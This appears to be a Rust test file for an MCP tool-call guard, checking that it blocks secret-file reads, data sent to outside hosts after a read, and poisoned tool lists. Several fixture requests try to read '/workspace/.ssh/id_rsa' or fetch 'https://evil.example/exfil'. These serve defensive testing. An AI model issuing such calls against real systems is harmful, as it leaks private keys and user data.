//! Tool enforcement end-to-end tests: secret-overlay, side_effect, first-seen
//! tools/list poisoning, trajectory, inspect `-c`, and `generate-policy --self-test`.
//!
//! These tests spawn the `mcp-writ` binary. Warden is skipped via
//! `MCP_WRIT_SKIP_SANDBOX=1` (same as `tests/integration.rs`) so Linux
//! Landlock/seccomp does not constrain the guard process itself.

use std::path::Path;
use std::process::Stdio;
use tempfile::TempDir;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::process::Command;
use tokio::time::{Duration, timeout};

mod common;

const TIMEOUT_SECS: u64 = 12;

struct ChildGuard(tokio::process::Child);

impl Drop for ChildGuard {
    fn drop(&mut self) {
        let _ = self.0.start_kill();
    }
}

fn make_test_dir(label: &str) -> TempDir {
    tempfile::Builder::new()
        .prefix(&format!("mcp_writ_tool_enforcement_{label}_"))
        .tempdir()
        .expect("failed to create temp directory")
}

fn write_policy(dir: &Path, content: &str) -> std::path::PathBuf {
    let path = dir.join("policy.kdl");
    std::fs::write(&path, content).expect("write policy");
    path
}

const BASE_POLICY: &str = r##"
policy version=1
defaults {
    filesystem {
        secret-overlay #true
    }
}
logging level="info" fail_closed=#false
server "tool-enforcement" {
    tool "read_file" side_effect="read_only" {
        filesystem {
            allow "/workspace/**"
        }
    }
    tool "fetch_url" side_effect="network" {
        network {
            allow host="*"
        }
    }
}
"##;

const TRAJECTORY_POLICY: &str = r##"
policy version=1
defaults {
    filesystem {
        secret-overlay #true
    }
}
logging level="info" fail_closed=#false
server "tool-enforcement" {
    tool "read_file" side_effect="read_only" {
        filesystem {
            allow "/workspace/**"
        }
    }
    tool "fetch_url" side_effect="network" {
        network {
            allow host="*"
        }
    }
    tool "fail_write" side_effect="write" {
        filesystem {
            allow "/workspace/**"
        }
    }
}
trajectory #true {
    after side_effect="read_only" deny-next="network"
}
"##;

fn spawn_guard(
    policy_path: &Path,
    dry_run: bool,
    child_argv: &[String],
    extra_env: &[(&str, &str)],
) -> tokio::process::Child {
    spawn_guard_with(policy_path, dry_run, None, child_argv, extra_env)
}

fn spawn_guard_with(
    policy_path: &Path,
    dry_run: bool,
    fail_on: Option<&str>,
    child_argv: &[String],
    extra_env: &[(&str, &str)],
) -> tokio::process::Child {
    spawn_guard_at(
        policy_path,
        dry_run,
        fail_on,
        child_argv,
        extra_env,
        &common::next_audit_log_path(),
    )
}

/// Same as [`spawn_guard_with`], but records the audit log at `audit_log`
/// so the test can inspect it after the guard exits.
fn spawn_guard_at(
    policy_path: &Path,
    dry_run: bool,
    fail_on: Option<&str>,
    child_argv: &[String],
    extra_env: &[(&str, &str)],
    audit_log: &Path,
) -> tokio::process::Child {
    let mut cmd = Command::new(env!("CARGO_BIN_EXE_mcp-writ"));
    cmd.args([
        "run",
        "--transport",
        "stdio",
        "--policy",
        policy_path.to_str().expect("policy path utf-8"),
        "--audit-log",
        audit_log.to_str().expect("audit log path is utf-8"),
    ]);
    if dry_run {
        cmd.arg("--dry-run");
    }
    if let Some(level) = fail_on {
        cmd.args(["--fail-on", level]);
    }
    cmd.arg("--");
    cmd.args(child_argv);
    cmd.env("MCP_WRIT_SKIP_SANDBOX", "1");
    for (key, val) in extra_env {
        cmd.env(key, val);
    }
    cmd.stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("failed to spawn mcp-writ binary - did you run `cargo build`?")
}

fn scripted_argv() -> Vec<String> {
    common::python3_script_argv("tests/fixtures/mcp_servers/scripted_stdio.py")
}

async fn send_and_recv(
    stdin: &mut tokio::process::ChildStdin,
    reader: &mut tokio::io::Lines<BufReader<tokio::process::ChildStdout>>,
    request: &str,
) -> String {
    stdin
        .write_all(format!("{request}\n").as_bytes())
        .await
        .expect("failed to write request to mcp-writ stdin");
    stdin.flush().await.expect("failed to flush mcp-writ stdin");

    recv_jsonrpc(reader).await
}

async fn recv_jsonrpc(
    reader: &mut tokio::io::Lines<BufReader<tokio::process::ChildStdout>>,
) -> String {
    timeout(Duration::from_secs(TIMEOUT_SECS), async {
        loop {
            let line = reader
                .next_line()
                .await
                .expect("IO error reading mcp-writ stdout")
                .expect("unexpected EOF on mcp-writ stdout - child process may have exited");
            if line.starts_with("{\"jsonrpc\"") {
                return line;
            }
        }
    })
    .await
    .expect("timeout waiting for JSON-RPC response from mcp-writ")
}

async fn send_and_recv_allow_eof(
    stdin: &mut tokio::process::ChildStdin,
    reader: &mut tokio::io::Lines<BufReader<tokio::process::ChildStdout>>,
    request: &str,
) -> Option<String> {
    if stdin
        .write_all(format!("{request}\n").as_bytes())
        .await
        .is_err()
    {
        return None;
    }
    if stdin.flush().await.is_err() {
        return None;
    }
    timeout(Duration::from_secs(TIMEOUT_SECS), async {
        loop {
            match reader.next_line().await {
                Ok(Some(line)) if line.starts_with("{\"jsonrpc\"") => return Some(line),
                Ok(Some(_)) => continue,
                Ok(None) | Err(_) => return None,
            }
        }
    })
    .await
    .ok()
    .flatten()
}

fn json_has_method(response: &str) -> bool {
    let json = nojson::RawJson::parse(response).expect("valid JSON");
    json.value()
        .to_member("method")
        .ok()
        .and_then(|m| m.optional())
        .is_some()
}

fn json_result_is_error(response: &str) -> bool {
    let json = nojson::RawJson::parse(response).expect("valid JSON");
    json.value()
        .to_member("result")
        .ok()
        .and_then(|m| m.optional())
        .and_then(|result| result.to_member("isError").ok().and_then(|m| m.optional()))
        .and_then(|v| v.as_boolean_str().ok())
        == Some("true")
}

fn json_has_error(response: &str) -> bool {
    let json = nojson::RawJson::parse(response).expect("valid JSON");
    json.value()
        .to_member("error")
        .ok()
        .and_then(|m| m.optional())
        .is_some()
}

fn json_has_result(response: &str) -> bool {
    let json = nojson::RawJson::parse(response).expect("valid JSON");
    json.value()
        .to_member("result")
        .ok()
        .and_then(|m| m.optional())
        .is_some()
}

fn error_message(response: &str) -> String {
    let json = nojson::RawJson::parse(response).expect("valid JSON");
    json.value()
        .to_member("error")
        .expect("error")
        .required()
        .expect("error present")
        .to_member("message")
        .expect("message")
        .required()
        .expect("message present")
        .to_unquoted_string_str()
        .expect("message string")
        .into_owned()
}

// ─── P1: secret-overlay ─────────────────────────────────────────────

#[tokio::test]
async fn secret_overlay_denies_ssh_key_allows_notes() {
    let dir = make_test_dir("overlay");
    let policy = write_policy(dir.path(), BASE_POLICY);
    let mut child = spawn_guard(&policy, false, &common::echo_stdio_argv(), &[]);
    let mut stdin = child.stdin.take().expect("stdin");
    let stdout = child.stdout.take().expect("stdout");
    let _guard = ChildGuard(child);
    let mut reader = BufReader::new(stdout).lines();

    let denied = r#"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"/workspace/.ssh/id_rsa"}}}"#;
    let deny_resp = send_and_recv(&mut stdin, &mut reader, denied).await;
    assert!(json_has_error(&deny_resp), "got: {deny_resp}");
    assert!(!json_has_result(&deny_resp), "got: {deny_resp}");
    let msg = error_message(&deny_resp);
    assert!(
        msg.contains("secret") || msg.contains("id_rsa") || msg.contains("overlay"),
        "expected secret-overlay deny, got: {msg}"
    );

    let allowed = r#"{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"/workspace/notes.txt"}}}"#;
    let allow_resp = send_and_recv(&mut stdin, &mut reader, allowed).await;
    assert_eq!(allow_resp, allowed, "notes.txt should pass through");

    drop(stdin);
}

// ─── P1: read_only + URL/host ───────────────────────────────────────

#[tokio::test]
async fn read_only_side_effect_denies_url_argument() {
    let dir = make_test_dir("readonly_url");
    let policy = write_policy(dir.path(), BASE_POLICY);
    let mut child = spawn_guard(&policy, false, &common::echo_stdio_argv(), &[]);
    let mut stdin = child.stdin.take().expect("stdin");
    let stdout = child.stdout.take().expect("stdout");
    let _guard = ChildGuard(child);
    let mut reader = BufReader::new(stdout).lines();

    let request = r#"{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"read_file","arguments":{"url":"https://evil.example/exfil"}}}"#;
    let response = send_and_recv(&mut stdin, &mut reader, request).await;
    assert!(json_has_error(&response), "got: {response}");
    assert!(!json_has_result(&response), "got: {response}");
    let msg = error_message(&response);
    assert!(
        msg.contains("read_only") || msg.contains("host") || msg.contains("URL"),
        "expected read_only URL deny, got: {msg}"
    );

    drop(stdin);
}

// ─── P1: poisoned tools/list ────────────────────────────────────────

async fn assert_tools_list_poisoned(mode: &str, expected_cc: &str, dry_run: bool) {
    let dir = make_test_dir(&format!("list_{mode}"));
    let policy = write_policy(dir.path(), BASE_POLICY);
    let mut child = spawn_guard(
        &policy,
        dry_run,
        &scripted_argv(),
        &[("MCP_WRIT_FIXTURE", mode)],
    );
    let mut stdin = child.stdin.take().expect("stdin");
    let stdout = child.stdout.take().expect("stdout");
    let _guard = ChildGuard(child);
    let mut reader = BufReader::new(stdout).lines();

    let request = r#"{"jsonrpc":"2.0","id":40,"method":"tools/list","params":{}}"#;
    let response = send_and_recv(&mut stdin, &mut reader, request).await;
    assert!(json_has_error(&response), "got: {response}");
    assert!(
        !json_has_result(&response),
        "client must not receive a tools/list result: {response}"
    );
    let msg = error_message(&response);
    assert!(
        msg.contains(expected_cc),
        "expected {expected_cc} in error, got: {msg}"
    );
    assert!(
        !response.contains("\"tools\""),
        "must not leak tools array: {response}"
    );

    drop(stdin);
}

#[tokio::test]
async fn poisoned_tools_list_cc001_is_jsonrpc_error_without_result() {
    assert_tools_list_poisoned("tools_list_cc001", "CC-001", false).await;
}

#[tokio::test]
async fn poisoned_tools_list_cc005_is_jsonrpc_error_without_result() {
    assert_tools_list_poisoned("tools_list_cc005", "CC-005", false).await;
}

#[tokio::test]
async fn dry_run_still_blocks_first_seen_cc001() {
    assert_tools_list_poisoned("tools_list_cc001", "CC-001", true).await;
}

#[tokio::test]
async fn poisoned_tools_list_cc011_is_jsonrpc_error_without_result() {
    assert_tools_list_poisoned("tools_list_cc011", "CC-011", false).await;
}

#[tokio::test]
async fn transfer_b_drops_unknown_vendor_key_from_forwarded_tools_list() {
    let dir = make_test_dir("list_vendor");
    let policy = write_policy(dir.path(), BASE_POLICY);
    let mut child = spawn_guard(
        &policy,
        false,
        &scripted_argv(),
        &[("MCP_WRIT_FIXTURE", "tools_list_vendor")],
    );
    let mut stdin = child.stdin.take().expect("stdin");
    let stdout = child.stdout.take().expect("stdout");
    let _guard = ChildGuard(child);
    let mut reader = BufReader::new(stdout).lines();

    let request = r#"{"jsonrpc":"2.0","id":41,"method":"tools/list","params":{}}"#;
    let response = send_and_recv(&mut stdin, &mut reader, request).await;
    assert!(
        json_has_result(&response),
        "clean vendor-key list must be forwarded: {response}"
    );
    assert!(!json_has_error(&response), "got: {response}");
    assert!(
        !response.contains("x-system"),
        "Verified response forwarding must drop unknown vendor keys: {response}"
    );
    assert!(
        !response.contains("vendor-extra-marker"),
        "vendor value must not leak: {response}"
    );
    assert!(
        response.contains("read_file"),
        "verified surface must still include the tool: {response}"
    );

    drop(stdin);
}

// ─── P1: trajectory ─────────────────────────────────────────────────

#[tokio::test]
async fn trajectory_on_denies_network_after_successful_read() {
    let dir = make_test_dir("traj_on");
    let policy = write_policy(dir.path(), TRAJECTORY_POLICY);
    let mut child = spawn_guard(
        &policy,
        false,
        &scripted_argv(),
        &[("MCP_WRIT_FIXTURE", "tools_call_ok")],
    );
    let mut stdin = child.stdin.take().expect("stdin");
    let stdout = child.stdout.take().expect("stdout");
    let _guard = ChildGuard(child);
    let mut reader = BufReader::new(stdout).lines();

    let read = r#"{"jsonrpc":"2.0","id":50,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"/workspace/notes.txt"}}}"#;
    let read_resp = send_and_recv(&mut stdin, &mut reader, read).await;
    assert!(
        json_has_result(&read_resp),
        "successful read should return result: {read_resp}"
    );
    assert!(!json_has_error(&read_resp), "got: {read_resp}");

    let fetch = r#"{"jsonrpc":"2.0","id":51,"method":"tools/call","params":{"name":"fetch_url","arguments":{"url":"https://evil.example/exfil"}}}"#;
    let fetch_resp = send_and_recv(&mut stdin, &mut reader, fetch).await;
    assert!(json_has_error(&fetch_resp), "got: {fetch_resp}");
    assert!(!json_has_result(&fetch_resp), "got: {fetch_resp}");
    let msg = error_message(&fetch_resp);
    assert!(
        msg.contains("trajectory"),
        "expected trajectory deny, got: {msg}"
    );

    drop(stdin);
}

#[tokio::test]
async fn trajectory_off_allows_read_then_network() {
    let dir = make_test_dir("traj_off");
    let policy = write_policy(dir.path(), BASE_POLICY);
    let mut child = spawn_guard(
        &policy,
        false,
        &scripted_argv(),
        &[("MCP_WRIT_FIXTURE", "tools_call_ok")],
    );
    let mut stdin = child.stdin.take().expect("stdin");
    let stdout = child.stdout.take().expect("stdout");
    let _guard = ChildGuard(child);
    let mut reader = BufReader::new(stdout).lines();

    let read = r#"{"jsonrpc":"2.0","id":60,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"/workspace/notes.txt"}}}"#;
    let read_resp = send_and_recv(&mut stdin, &mut reader, read).await;
    assert!(json_has_result(&read_resp), "got: {read_resp}");

    let fetch = r#"{"jsonrpc":"2.0","id":61,"method":"tools/call","params":{"name":"fetch_url","arguments":{"url":"https://evil.example/exfil"}}}"#;
    let fetch_resp = send_and_recv(&mut stdin, &mut reader, fetch).await;
    assert!(
        json_has_result(&fetch_resp),
        "trajectory off should allow network after read: {fetch_resp}"
    );
    assert!(!json_has_error(&fetch_resp), "got: {fetch_resp}");

    drop(stdin);
}

#[tokio::test]
async fn trajectory_is_error_write_does_not_clear_read() {
    let dir = make_test_dir("traj_iserror");
    let policy = write_policy(dir.path(), TRAJECTORY_POLICY);
    let mut child = spawn_guard(
        &policy,
        false,
        &scripted_argv(),
        &[("MCP_WRIT_FIXTURE", "tools_call_ok")],
    );
    let mut stdin = child.stdin.take().expect("stdin");
    let stdout = child.stdout.take().expect("stdout");
    let _guard = ChildGuard(child);
    let mut reader = BufReader::new(stdout).lines();

    let read = r#"{"jsonrpc":"2.0","id":70,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"/workspace/notes.txt"}}}"#;
    let read_resp = send_and_recv(&mut stdin, &mut reader, read).await;
    assert!(json_has_result(&read_resp), "got: {read_resp}");
    assert!(!json_result_is_error(&read_resp), "got: {read_resp}");

    let write = r#"{"jsonrpc":"2.0","id":71,"method":"tools/call","params":{"name":"fail_write","arguments":{"path":"/workspace/notes.txt"}}}"#;
    let write_resp = send_and_recv(&mut stdin, &mut reader, write).await;
    assert!(
        json_has_result(&write_resp) && json_result_is_error(&write_resp),
        "MCP tool failure must be result.isError=true, got: {write_resp}"
    );
    assert!(!json_has_error(&write_resp), "got: {write_resp}");

    let fetch = r#"{"jsonrpc":"2.0","id":72,"method":"tools/call","params":{"name":"fetch_url","arguments":{"url":"https://evil.example/exfil"}}}"#;
    let fetch_resp = send_and_recv(&mut stdin, &mut reader, fetch).await;
    assert!(json_has_error(&fetch_resp), "got: {fetch_resp}");
    let msg = error_message(&fetch_resp);
    assert!(
        msg.contains("trajectory"),
        "failed write must not clear read_only trajectory, got: {msg}"
    );

    drop(stdin);
}

#[tokio::test]
async fn trajectory_s2c_request_same_id_does_not_drop_pending_read() {
    let dir = make_test_dir("traj_s2c");
    let policy = write_policy(dir.path(), TRAJECTORY_POLICY);
    let mut child = spawn_guard(
        &policy,
        false,
        &scripted_argv(),
        &[("MCP_WRIT_FIXTURE", "s2c_id_collision")],
    );
    let mut stdin = child.stdin.take().expect("stdin");
    let stdout = child.stdout.take().expect("stdout");
    let _guard = ChildGuard(child);
    let mut reader = BufReader::new(stdout).lines();

    let read = r#"{"jsonrpc":"2.0","id":80,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"/workspace/notes.txt"}}}"#;
    stdin
        .write_all(format!("{read}\n").as_bytes())
        .await
        .expect("write read_file");
    stdin.flush().await.expect("flush");
    let first = recv_jsonrpc(&mut reader).await;
    assert!(
        json_has_method(&first),
        "server request with colliding id must be forwarded, got: {first}"
    );
    let second = recv_jsonrpc(&mut reader).await;
    assert!(
        json_has_result(&second) && !json_has_method(&second),
        "read success response must still complete the pending call, got: {second}"
    );

    let fetch = r#"{"jsonrpc":"2.0","id":81,"method":"tools/call","params":{"name":"fetch_url","arguments":{"url":"https://evil.example/exfil"}}}"#;
    let fetch_resp = send_and_recv(&mut stdin, &mut reader, fetch).await;
    assert!(json_has_error(&fetch_resp), "got: {fetch_resp}");
    let msg = error_message(&fetch_resp);
    assert!(
        msg.contains("trajectory"),
        "S2C request must not drop pending read, got: {msg}"
    );

    drop(stdin);
}

// ─── list_changed revalidation ──────────────────────────────────────

fn json_method(line: &str) -> Option<String> {
    let json = nojson::RawJson::parse(line).ok()?;
    json.value()
        .to_member("method")
        .ok()
        .and_then(|m| m.optional())
        .and_then(|v| v.to_unquoted_string_str().ok())
        .map(|s| s.into_owned())
}

#[tokio::test]
async fn list_changed_revalidates_then_forwards_and_denies_mid_relist_call() {
    let dir = make_test_dir("list_changed_ok");
    let policy = write_policy(dir.path(), BASE_POLICY);
    let mut child = spawn_guard(
        &policy,
        false,
        &scripted_argv(),
        &[("MCP_WRIT_FIXTURE", "list_changed_ok")],
    );
    let mut stdin = child.stdin.take().expect("stdin");
    let stdout = child.stdout.take().expect("stdout");
    let _guard = ChildGuard(child);
    let mut reader = BufReader::new(stdout).lines();

    let list = r#"{"jsonrpc":"2.0","id":70,"method":"tools/list","params":{}}"#;
    let list_resp = send_and_recv(&mut stdin, &mut reader, list).await;
    assert!(json_has_result(&list_resp), "got: {list_resp}");
    assert!(
        list_resp.contains("\"title\":\"Read File\""),
        "Verified response forwarding must forward title: {list_resp}"
    );
    assert!(
        list_resp.contains("readOnlyHint"),
        "Verified response forwarding must forward annotations: {list_resp}"
    );

    // Server already emitted list_changed; guard holds it and re-lists.
    // Give S2C a beat to set list_busy before the mid-relist probe. The
    // fixture delays the second tools/list by 400ms, so this stays mid-flight.
    tokio::time::sleep(Duration::from_millis(80)).await;
    let call = r#"{"jsonrpc":"2.0","id":71,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"/workspace/notes.txt"}}}"#;
    let call_resp = send_and_recv(&mut stdin, &mut reader, call).await;
    assert!(json_has_error(&call_resp), "got: {call_resp}");
    let msg = error_message(&call_resp);
    assert!(
        msg.contains("revalidation") || msg.contains("in progress"),
        "expected mid-relist deny, got: {msg}"
    );

    let notif = timeout(Duration::from_secs(TIMEOUT_SECS), async {
        loop {
            let line = reader
                .next_line()
                .await
                .expect("IO error reading mcp-writ stdout")
                .expect("unexpected EOF waiting for list_changed");
            if line.starts_with("{\"jsonrpc\"") {
                return line;
            }
        }
    })
    .await
    .expect("timeout waiting for forwarded list_changed");
    assert_eq!(
        json_method(&notif).as_deref(),
        Some("notifications/tools/list_changed"),
        "notification must be forwarded only after revalidation: {notif}"
    );

    drop(stdin);
}

#[tokio::test]
async fn list_changed_poisoned_relist_aborts_without_forwarding_notification() {
    let dir = make_test_dir("list_changed_cc001");
    let policy = write_policy(dir.path(), BASE_POLICY);
    let mut child = spawn_guard(
        &policy,
        false,
        &scripted_argv(),
        &[("MCP_WRIT_FIXTURE", "list_changed_cc001")],
    );
    let mut stdin = child.stdin.take().expect("stdin");
    let stdout = child.stdout.take().expect("stdout");
    let _guard = ChildGuard(child);
    let mut reader = BufReader::new(stdout).lines();

    let list = r#"{"jsonrpc":"2.0","id":80,"method":"tools/list","params":{}}"#;
    let list_resp = send_and_recv(&mut stdin, &mut reader, list).await;
    assert!(json_has_result(&list_resp), "got: {list_resp}");

    let next = timeout(Duration::from_secs(TIMEOUT_SECS), async {
        loop {
            let line = reader
                .next_line()
                .await
                .expect("IO error reading mcp-writ stdout")
                .expect("unexpected EOF after poisoned relist");
            if line.starts_with("{\"jsonrpc\"") {
                return line;
            }
        }
    })
    .await
    .expect("timeout waiting for abort after list_changed");
    assert_ne!(
        json_method(&next).as_deref(),
        Some("notifications/tools/list_changed"),
        "must not forward list_changed after blocking CC: {next}"
    );
    assert!(json_has_error(&next), "got: {next}");
    let msg = error_message(&next);
    assert!(msg.contains("CC-001"), "expected CC-001 abort, got: {msg}");

    drop(stdin);
}

#[tokio::test]
async fn list_changed_relist_error_keeps_tools_call_denied() {
    let dir = make_test_dir("list_changed_error");
    let policy = write_policy(dir.path(), BASE_POLICY);
    let mut child = spawn_guard(
        &policy,
        false,
        &scripted_argv(),
        &[("MCP_WRIT_FIXTURE", "list_changed_error")],
    );
    let mut stdin = child.stdin.take().expect("stdin");
    let stdout = child.stdout.take().expect("stdout");
    let _guard = ChildGuard(child);
    let mut reader = BufReader::new(stdout).lines();

    let list = r#"{"jsonrpc":"2.0","id":90,"method":"tools/list","params":{}}"#;
    let list_resp = send_and_recv(&mut stdin, &mut reader, list).await;
    assert!(json_has_result(&list_resp), "got: {list_resp}");

    // Same race as the happy-path relist test: wait for S2C to observe
    // list_changed (and set list_busy) before the mid-relist tools/call.
    tokio::time::sleep(Duration::from_millis(80)).await;
    let mid = r#"{"jsonrpc":"2.0","id":91,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"/workspace/notes.txt"}}}"#;
    let mid_resp = send_and_recv(&mut stdin, &mut reader, mid).await;
    assert!(json_has_error(&mid_resp), "got: {mid_resp}");
    assert!(
        error_message(&mid_resp).contains("revalidation")
            || error_message(&mid_resp).contains("in progress"),
        "got: {mid_resp}"
    );

    // After the delayed JSON-RPC error, busy must stay set until abort so a
    // concurrent tools/call cannot slip through to the child (which would
    // answer {"ok":true}).
    tokio::time::sleep(Duration::from_millis(500)).await;
    let late = r#"{"jsonrpc":"2.0","id":92,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"/workspace/notes.txt"}}}"#;
    let late_resp = send_and_recv_allow_eof(&mut stdin, &mut reader, late).await;
    if let Some(resp) = late_resp {
        assert!(
            json_has_error(&resp),
            "tools/call after relist error must stay denied, got: {resp}"
        );
        assert!(
            !resp.contains("\"ok\":true"),
            "must not reach the child after relist error: {resp}"
        );
    }

    drop(stdin);
}

// ─── P2: inspect -c / --eval ────────────────────────────────────────

#[test]
fn inspect_inline_eval_warns_and_skips_ast_and_elf() {
    let mut cmd = std::process::Command::new(env!("CARGO_BIN_EXE_mcp-writ"));
    cmd.arg("inspect").arg("--");
    if cfg!(windows) {
        cmd.args(["py", "-3", "-c", "print(1)"]);
    } else {
        cmd.args(["python3", "-c", "print(1)"]);
    }
    let output = cmd.output().expect("spawn inspect");
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        output.status.success(),
        "inspect -c should exit 0, status={:?} stderr={stderr}",
        output.status
    );
    assert!(
        stderr.contains("not statically parseable")
            && stderr.contains("skipping source AST and native binary"),
        "expected InlineEval warning, stderr={stderr}"
    );
}

// ─── P2: generate-policy --self-test CLI ────────────────────────────

#[test]
fn generate_policy_self_test_cli_runs() {
    let script = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("tests/fixtures/py_mcp/eval_only.py");
    let mut cmd = std::process::Command::new(env!("CARGO_BIN_EXE_mcp-writ"));
    cmd.args(["generate-policy", "--self-test", "--"]);
    if cfg!(windows) {
        cmd.args(["py", "-3"]);
    } else {
        cmd.arg("python3");
    }
    cmd.arg(script);
    cmd.env("MCP_WRIT_SKIP_SANDBOX", "1");
    let output = cmd.output().expect("spawn generate-policy --self-test");
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stdout.contains("policy version=") || stdout.contains("policy version"),
        "draft should be printed, stdout={stdout} stderr={stderr}"
    );
    assert!(
        stderr.contains("auditor:"),
        "self-test path must print auditor: line, stderr={stderr}"
    );
    let code = output.status.code().unwrap_or(1);
    assert!(
        code == 0 || code == 2,
        "self-test should complete (0=evidence, 2=insufficient), got {code}: stderr={stderr}"
    );
}

// ─── F7-D1: --fail-on severity dial ─────────────────────────────────

async fn tools_list_response(
    fail_on: Option<&str>,
    extra_env: &[(&str, &str)],
    fixture: &str,
    dry_run: bool,
) -> (String, String) {
    let dir = make_test_dir(&format!("fail_on_{fixture}"));
    let policy = write_policy(dir.path(), BASE_POLICY);
    let mut env = extra_env.to_vec();
    env.push(("MCP_WRIT_FIXTURE", fixture));
    let mut child = spawn_guard_with(&policy, dry_run, fail_on, &scripted_argv(), &env);
    let mut stdin = child.stdin.take().expect("stdin");
    let stdout = child.stdout.take().expect("stdout");
    let stderr = child.stderr.take().expect("stderr");
    let _guard = ChildGuard(child);
    let mut reader = BufReader::new(stdout).lines();
    let request = r#"{"jsonrpc":"2.0","id":40,"method":"tools/list","params":{}}"#;
    let response = send_and_recv(&mut stdin, &mut reader, request).await;
    drop(stdin);
    let mut stderr_lines = BufReader::new(stderr).lines();
    let mut stderr_text = String::new();
    let _ = timeout(Duration::from_millis(500), async {
        while let Ok(Some(line)) = stderr_lines.next_line().await {
            stderr_text.push_str(&line);
            stderr_text.push('\n');
        }
    })
    .await;
    (response, stderr_text)
}

#[tokio::test]
async fn fail_on_default_high_still_aborts_cc005() {
    let (response, _) = tools_list_response(None, &[], "tools_list_cc005", false).await;
    assert!(json_has_error(&response), "got: {response}");
    assert!(!json_has_result(&response), "got: {response}");
    assert!(
        error_message(&response).contains("CC-005"),
        "got: {response}"
    );
}

#[tokio::test]
async fn fail_on_critical_demotes_high_cc005_and_still_aborts_cc001() {
    let (high, _) = tools_list_response(Some("critical"), &[], "tools_list_cc005", false).await;
    assert!(
        json_has_result(&high),
        "fail-on critical must forward High CC-005: {high}"
    );
    assert!(!json_has_error(&high), "got: {high}");

    let (crit, _) = tools_list_response(Some("critical"), &[], "tools_list_cc001", false).await;
    assert!(json_has_error(&crit), "CC-001 must still abort: {crit}");
    assert!(!json_has_result(&crit), "got: {crit}");
}

#[tokio::test]
async fn fail_on_none_never_aborts_on_cc_and_warns_stderr() {
    let (response, stderr) =
        tools_list_response(Some("none"), &[], "tools_list_cc001", false).await;
    assert!(
        json_has_result(&response),
        "fail-on none must not abort on CC-001: {response}"
    );
    assert!(!json_has_error(&response), "got: {response}");
    assert!(
        stderr.contains("never aborts on CC") && stderr.contains("dangerous"),
        "startup must warn on stderr, got: {stderr}"
    );
}

#[tokio::test]
async fn fail_on_env_critical_without_cli() {
    let (response, _) = tools_list_response(
        None,
        &[("MCP_WRIT_FAIL_ON", "critical")],
        "tools_list_cc005",
        false,
    )
    .await;
    assert!(
        json_has_result(&response),
        "env fail-on critical must forward High: {response}"
    );
}

#[tokio::test]
async fn fail_on_cli_overrides_env() {
    let (response, _) = tools_list_response(
        Some("high"),
        &[("MCP_WRIT_FAIL_ON", "none")],
        "tools_list_cc005",
        false,
    )
    .await;
    assert!(
        json_has_error(&response),
        "CLI high must win over env none: {response}"
    );
}

#[tokio::test]
async fn fail_on_empty_env_is_default_high() {
    let (response, _) =
        tools_list_response(None, &[("MCP_WRIT_FAIL_ON", "")], "tools_list_cc005", false).await;
    assert!(
        json_has_error(&response),
        "empty env must default to high: {response}"
    );
}

#[tokio::test]
async fn fail_on_dry_run_uses_same_threshold() {
    let (blocked, _) = tools_list_response(Some("high"), &[], "tools_list_cc005", true).await;
    assert!(
        json_has_error(&blocked),
        "dry-run + high still aborts High: {blocked}"
    );

    let (forwarded, _) = tools_list_response(Some("critical"), &[], "tools_list_cc005", true).await;
    assert!(
        json_has_result(&forwarded),
        "dry-run + critical must use the same High demotion: {forwarded}"
    );
}

#[tokio::test]
async fn fail_on_critical_list_changed_high_is_forwarded() {
    let dir = make_test_dir("fail_on_list_changed_cc005");
    let policy = write_policy(dir.path(), BASE_POLICY);
    let mut child = spawn_guard_with(
        &policy,
        false,
        Some("critical"),
        &scripted_argv(),
        &[("MCP_WRIT_FIXTURE", "list_changed_cc005")],
    );
    let mut stdin = child.stdin.take().expect("stdin");
    let stdout = child.stdout.take().expect("stdout");
    let _guard = ChildGuard(child);
    let mut reader = BufReader::new(stdout).lines();

    let list = r#"{"jsonrpc":"2.0","id":80,"method":"tools/list","params":{}}"#;
    let list_resp = send_and_recv(&mut stdin, &mut reader, list).await;
    assert!(json_has_result(&list_resp), "got: {list_resp}");

    let notif = timeout(Duration::from_secs(TIMEOUT_SECS), async {
        loop {
            let line = reader
                .next_line()
                .await
                .expect("IO error reading mcp-writ stdout")
                .expect("unexpected EOF waiting for list_changed");
            if line.starts_with("{\"jsonrpc\"") {
                return line;
            }
        }
    })
    .await
    .expect("timeout waiting for forwarded list_changed");
    assert_eq!(
        json_method(&notif).as_deref(),
        Some("notifications/tools/list_changed"),
        "High relist under fail-on critical must forward: {notif}"
    );

    drop(stdin);
}

#[test]
fn fail_on_invalid_cli_and_env_reject_at_startup() {
    let output = std::process::Command::new(env!("CARGO_BIN_EXE_mcp-writ"))
        .args(["run", "--fail-on", "medium", "--", "true"])
        .output()
        .expect("spawn");
    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("medium"), "got: {stderr}");
    assert!(stderr.contains("high, critical, or none"), "got: {stderr}");

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_mcp-writ"))
        .args(["run", "--", "true"])
        .env("MCP_WRIT_FAIL_ON", "medium")
        .output()
        .expect("spawn");
    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("medium"), "got: {stderr}");

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_mcp-writ"))
        .args(["run", "--no-fail", "--", "true"])
        .output()
        .expect("spawn");
    assert!(!output.status.success(), "--no-fail must not exist");
}

// ─── tools/list allowlist filter ────────────────────────────────────

/// One allowed tool (`read_file`), one denied (`fetch_url`), one unlisted
/// (`fail_write`). The `tools_call_ok` fixture — and `list_changed_ok`
/// relists — advertise all three.
const FILTER_POLICY: &str = r##"
policy version=1
defaults {
    filesystem {
        secret-overlay #true
    }
}
